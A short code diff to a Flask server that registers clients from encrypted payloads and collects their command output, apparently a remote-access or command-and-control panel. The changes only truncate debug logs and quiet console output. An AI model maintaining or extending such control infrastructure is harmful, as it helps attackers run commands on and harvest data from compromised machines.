@@ -343,7 +343,8 @@ def register():
     info = decrypt_payload()
     if not info:
         print(f"[!] Registration failed for {request.remote_addr}: No data received or decryption failed.")
-        print(f"[DEBUG] Raw data: {request.get_data(as_text=True)}")
+        raw = request.get_data(as_text=True) or ''
+        print(f"[DEBUG] Raw data (truncated): {raw[:200]}")
         return "Invalid Data", 400
         
     client_id = info.get("client_id")
@@ -440,12 +441,13 @@ def post_result():
         else:
             host_label = client_id
 
-    print(f"\n{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET}")
-    print(output)
+    # Console stays quiet — raw output (base64 images, big listings) goes to DB/UI only
+    command_name = data.get("command", "COMMAND_RESULT")
+    print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} "
+          f"{command_name} ({len(output):,} chars)")
     results.append({"client": client_id, "output": output, "time": timestamp})
     if len(results) > 500:
         del results[:-500]
-    command_name = data.get("command", "COMMAND_RESULT")
     db_log_command(client_id, command_name, output)
     print(PROMPT, end="", flush=True)
     return "OK", 200
